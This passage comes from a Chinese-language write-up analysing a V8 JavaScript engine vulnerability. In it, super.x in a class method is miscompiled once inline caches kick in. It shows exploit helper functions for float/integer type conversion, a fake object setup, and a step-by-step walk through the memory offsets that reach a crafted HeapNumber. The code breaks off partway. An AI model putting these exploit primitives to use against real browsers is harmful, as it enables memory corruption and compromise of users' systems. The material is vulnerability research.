            f64[0] = v;
            return u32;
        }
        function u2d(lo, hi) {
            u32[0] = lo;
            u32[1] = hi;
            return f64[0];
        }
        function ftoi(f)
        {
            f64[0] = f;
            return bigUint64[0];
        }
        function itof(i)
        {
            bigUint64[0] = i;
            return f64[0];
        }
        class C {
            m() {
                return super.x;
            }
        }
        obj_prop_ut_fake = {};
        for (let i = 0x0; i  module(+0xC) -> exports (+0x4) -> y(+0x28) -> value(+0x4)`
  2. 因为`Lazy feedback allocation`，`trigger`函数在执行10次之后，触发了`Inline Caches`，为了加速代码执行速度，把`super.x`取值的顺序直接转换成汇编代码。
  3. 漏洞代码，在翻译汇编代码的时候，把`super`翻译成了变量`c`。
  4. `c+0xC`位置储存的是`obj_prop_ut_fake`
  5. `obj_prop_ut_fake+0x4`储存的是该变量的`properties`（属性），也就是`obj_prop_ut_fake.xn`
  6. `obj_prop_ut_fake.properties + 0x28`获取到的是`HeapNumber`结构地址。
  7. `HeapNumber+0x4`地址的值为`u2d(0x40404042, 0)`
# 参考
  1. 
  2. 
  3. 
  4. 
* * *